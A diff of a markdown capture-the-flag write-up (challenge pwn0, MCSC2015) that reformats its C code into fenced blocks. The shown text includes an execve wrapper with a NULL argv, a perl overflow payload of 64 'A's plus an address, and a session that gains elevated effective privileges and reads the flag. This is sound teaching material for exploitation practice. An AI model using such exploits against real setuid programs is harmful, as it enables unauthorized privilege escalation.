@@ -47,22 +47,26 @@ execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is 
 with that said, let's start exploiting .....<br>
 First, we write a small program <br>
 \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
-\#include \<stdio.h><br>
-\#include \<stdlib.h><br>
-int main()<br>
-{<br>
-	execve("/challenges/pwn0/0",NULL,NULL);<br>
-}<br>
+```C
+#include <stdio.h>
+#include <stdlib.h>
+int main()
+{
+	execve("/challenges/pwn0/0",NULL,NULL);
+}
+```
 \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
 pwn0@MCSC2015:/tmp$ mkdir /tmp/testing<br>
 pwn0@MCSC2015:/tmp$ cd /tmp/testing/<br>
 pwn0@MCSC2015:/tmp/testing$ cat wrapper.c<br>
-\#include \<stdio.h><br>
-\#include \<stdlib.h><br>
-int main()<br>
-{<br>
-	execve("/challenges/pwn0/0",NULL,NULL);<br>
-}<br>
+```C
+#include <stdio.h>
+#include <stdlib.h>
+int main()
+{
+	execve("/challenges/pwn0/0",NULL,NULL);
+}
+```
 pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper<br>
 pwn0@MCSC2015:/tmp/testing$ ./wrapper <br>
 Good Boy<br>
@@ -77,7 +81,7 @@ pwn0@MCSC2015:/challenges/pwn0$ perl -e 'print "A"x64 . "\x6a\x34\x01\x00"' > /t
 pwn0@MCSC2015:/challenges/pwn0$ cat /tmp/testing/input -|/tmp/testing/wrapper <br>
 Good Boy<br>
 You Win<br>
-id<br>      
+id
 uid=1001(pwn0) gid=1001(pwn0) euid=1002(pwned0) egid=1002(pwned0) groups=1002(pwned0),1001(pwn0)<br>
 cat FLAG<br>
 flaG{I_4M_Th3_EaSy_One_Pwn_th3_N3xt_L3vel_If_U_C4N}<br>
